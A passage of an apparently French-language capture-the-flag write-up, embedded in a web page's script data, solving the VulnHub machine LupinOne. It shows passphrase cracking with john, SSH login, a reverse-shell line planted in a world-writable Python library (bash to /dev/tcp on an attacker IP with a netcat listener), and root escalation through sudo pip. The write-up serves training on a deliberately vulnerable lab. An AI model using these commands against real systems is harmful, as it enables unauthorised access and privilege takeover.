class=\"language-bash\"\u003E$ john \u003Cspan class=\"token builtin class-name\"\u003Ehash\u003C\u002Fspan\u003E --wordlist\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u002Fusr\u002Fshare\u002Fwordlists\u002Ffasttrack.txt\nP@55w0rd\u003Cspan class=\"token operator\"\u003E!\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EP√©n√©tration\u003C\u002Fh2\u003E\n\u003Cp\u003EOn a l'utilisateur, la clef SSH et le mot de passe.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Essh\u003C\u002Fspan\u003E icex64@\u003Cspan class=\"token variable\"\u003E$IP\u003C\u002Fspan\u003E -i id_rsa.pem\npassword: P@55w0rd\u003Cspan class=\"token operator\"\u003E!\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EDans le r√©pertoire de l'utilisateur, on trouve le premier flag.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E user.txt\n3mp\u003Cspan class=\"token operator\"\u003E!\u003C\u002Fspan\u003Er3\u003Cspan class=\"token punctuation\"\u003E{\u003C\u002Fspan\u003EI_See_That_You_Manage_To_Get_My_Bunny\u003Cspan class=\"token punctuation\"\u003E}\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Ch2\u003EEscalation\u003C\u002Fh2\u003E\n\u003Cp\u003EEnsuite, on regarde les privil√®ges de l'utilisateur courant.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E -l\nUser icex64 may run the following commands on LupinOne:\n    \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Earsene\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Fpython3.9 \u002Fhome\u002Farsene\u002Fheist.py\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn peut ex√©cuter ce script Python avec l'utilisateur \"arsene\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Fhome\u002Farsene\u002Fheist.py \n\u003Cspan class=\"token function\"\u003Eimport\u003C\u002Fspan\u003E webbrowser\n\nprint \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token string\"\u003E\"Its not yet ready to get in action\"\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\n\nwebbrowser.open\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token string\"\u003E\"https:\u002F\u002Fempirecybersecurity.co.mz\"\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003ELe script ne contient quasiment rien, si ce n'est la librairie \"webbrowser\". Sur le \u003Ca href=\"https:\u002F\u002Fgithub.com\u002Fpython\u002Fcpython\u002Fblob\u002F3.10\u002FLib\u002Fwebbrowser.py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003EGithub\u003C\u002Fa\u003E de cette librarie, on voit que la librairie \"Os\" est utilis√©e. On va donc modifier cette derni√®re (on n'a pas les droit d'√©criture sur le script final) afin d'ex√©cuter un webshell.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Efind\u003C\u002Fspan\u003E \u002F -name webbrowser.py\n\u002Fusr\u002Flib\u002Fpython3.9\u002Fwebbrowser.py\n-rwxrwxrwx \u003Cspan class=\"token number\"\u003E1\u003C\u002Fspan\u003E root root \u003Cspan class=\"token number\"\u003E24087\u003C\u002Fspan\u003E Oct  \u003Cspan class=\"token number\"\u003E4\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E18\u003C\u002Fspan\u003E:45 \u002Fusr\u002Flib\u002Fpython3.9\u002Fwebbrowser.py\n$ \u003Cspan class=\"token function\"\u003Enano\u003C\u002Fspan\u003E \u002Fusr\u002Flib\u002Fpython3.9\u002Fwebbrowser.py\nos.system\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003E\u003Cspan class=\"token string\"\u003E\"\u002Fbin\u002Fbash -c '\u002Fbin\u002Fbash -i \u003E&amp; \u002Fdev\u002Ftcp\u002F192.168.1.33\u002F1234 0\u003E&amp;1'\"\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EDans un autre onglet du terminal, on d√©marre le serveur \u003Cstrong\u003ENetcat\u003C\u002Fstrong\u003E sur le port \"1234\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Enc\u003C\u002Fspan\u003E -lnvp \u003Cspan class=\"token number\"\u003E1234\u003C\u002Fspan\u003E\nlistening on \u003Cspan class=\"token punctuation\"\u003E[\u003C\u002Fspan\u003Eany\u003Cspan class=\"token punctuation\"\u003E]\u003C\u002Fspan\u003E \u003Cspan class=\"token number\"\u003E1234\u003C\u002Fspan\u003E \u003Cspan class=\"token punctuation\"\u003E..\u003C\u002Fspan\u003E.\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EPuis on ex√©cute le script Python \u003Ccode class=\"language-text\"\u003Esudo -u arsene python3.9 \u002Fhome\u002Farsene\u002Fheist.py\u003C\u002Fcode\u003E et la connexion est effective avec l'utilisateur \"arsene\".\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E -l\nUser arsene may run the following commands on LupinOne:\n    \u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E NOPASSWD: \u002Fusr\u002Fbin\u002Fpip\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EL'utilisateur a le droit d'√©x√©cuter le gestionnaire de paquets de Python, \u003Cstrong\u003EPIP\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EAvant tout, il faut se mettre en Shell \u003Ccode class=\"language-text\"\u003Epython3 -c &#39;import pty; pty.spawn(&quot;\u002Fbin\u002Fsh&quot;)&#39;\u003C\u002Fcode\u003E pour pouvoir effectuer les commandes recommand√©es par \u003Ca href=\"https:\u002F\u002Fgtfobins.github.io\u002Fgtfobins\u002Fpip\u002F#sudo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003EGTFOBins\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token assign-left variable\"\u003ETF\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token variable\"\u003E$(\u003C\u002Fspan\u003Emktemp -d\u003Cspan class=\"token variable\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n$ \u003Cspan class=\"token builtin class-name\"\u003Eecho\u003C\u002Fspan\u003E \u003Cspan class=\"token string\"\u003E\"import os; os.execl('\u002Fbin\u002Fbash', 'bash', '-c', 'bash &lt;\u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token variable\"\u003E$(\u003C\u002Fspan\u003E\u003Cspan class=\"token function\"\u003Etty\u003C\u002Fspan\u003E\u003Cspan class=\"token variable\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003E\u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token variable\"\u003E$(\u003C\u002Fspan\u003E\u003Cspan class=\"token function\"\u003Etty\u003C\u002Fspan\u003E\u003Cspan class=\"token variable\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E 2\u003E\u003Cspan class=\"token variable\"\u003E\u003Cspan class=\"token variable\"\u003E$(\u003C\u002Fspan\u003E\u003Cspan class=\"token function\"\u003Etty\u003C\u002Fspan\u003E\u003Cspan class=\"token variable\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E')\"\u003C\u002Fspan\u003E \u003Cspan class=\"token operator\"\u003E\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token variable\"\u003E$TF\u003C\u002Fspan\u003E\u002Fsetup.py\n$ \u003Cspan class=\"token function\"\u003Esudo\u003C\u002Fspan\u003E pip \u003Cspan class=\"token function\"\u003Einstall\u003C\u002Fspan\u003E \u003Cspan class=\"token variable\"\u003E$TF\u003C\u002Fspan\u003E\n$ \u003Cspan class=\"token function\"\u003Eid\u003C\u002Fspan\u003E\n\u003Cspan class=\"token assign-left variable\"\u003Euid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egid\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E \u003Cspan class=\"token assign-left variable\"\u003Egroups\u003C\u002Fspan\u003E\u003Cspan class=\"token operator\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token number\"\u003E0\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E(\u003C\u002Fspan\u003Eroot\u003Cspan class=\"token punctuation\"\u003E)\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n\u003Cp\u003EOn est bien en root et on trouve le dernier flag.\u003C\u002Fp\u003E\n\u003Cdiv class=\"gridsome-highlight\" data-language=\"bash\"\u003E\u003Cpre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"\u003E\u003Ccode class=\"language-bash\"\u003E$ \u003Cspan class=\"token function\"\u003Ecat\u003C\u002Fspan\u003E \u002Froot\u002Froot.txt\n3mp\u003Cspan class=\"token operator\"\u003E!\u003C\u002Fspan\u003Er3\u003Cspan class=\"token punctuation\"\u003E{\u003C\u002Fspan\u003Econgratulations_you_manage_to_pwn_the_lupin1_box\u003Cspan class=\"token punctuation\"\u003E}\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003Cspan aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003Cspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fpre\u003E\u003C\u002Fdiv\u003E\n","download":"https:\u002F\u002Fwww.vulnhub.com\u002Fentry\u002Fempire-lupinone,750","tags":[{"title":"Pentest","path":"\u002Ftag\u002FPentest\u002F"},{"title":"CTF","path":"\u002Ftag\u002FCTF\u002F"}],"timeToRead":4,"parts":[]}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.50d8a5ce.js" defer></script><script src="/assets/js/page--src-templates-post-vue.56e5bc07.js" defer></script>
  </body>
</html>
